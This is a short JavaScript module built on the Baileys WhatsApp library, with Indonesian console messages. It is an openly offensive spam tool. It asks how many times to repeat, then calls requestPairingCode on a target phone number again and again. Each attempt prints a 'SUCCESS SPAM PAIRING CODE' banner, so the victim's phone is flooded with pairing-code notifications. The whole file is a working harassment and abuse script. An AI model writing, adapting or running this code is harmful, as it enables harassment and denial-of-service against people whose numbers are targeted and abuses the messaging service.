import { makeWASocket, useMultiFileAuthState } from "@whiskeysockets/baileys";
import pino from 'pino';
import readline from "readline";

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];
const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, (answer) => { rl.close(); resolve(answer); }) });
};

export async function startPairing(number) {
    const { state } = await useMultiFileAuthState('./session');
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        const phoneNumber = await number;
        const count = parseInt(await question(wColor + 'Total spam: ' + xColor));

        if (isNaN(count) || count <= 0) {
          console.clear()
            console.log('Example: 20.');
            return;
        }

        for (let i = 0; i < count; i++) {
            try {
                let code = await sock.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(wColor + "=============================================================");
console.log(wColor + `|          ✅ SUCCESS SPAM PAIRING CODE ✅          |`);
console.log(wColor + "|-----------------------------------------------------------|");
console.log(wColor + `| 📞 Number  : ${phoneNumber}`.padEnd(57) + "|");
console.log(wColor + `| 🔢 Attempt : [${i + 1}/${count}]`.padEnd(57) + "|");
console.log(wColor + "=============================================================" + xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
        
        console.log(wColor + "Sukses Spam pairing...., ctrl+c untuk keluar")
    } catch (error) {
        console.error('Error:', error.message);
    }
}
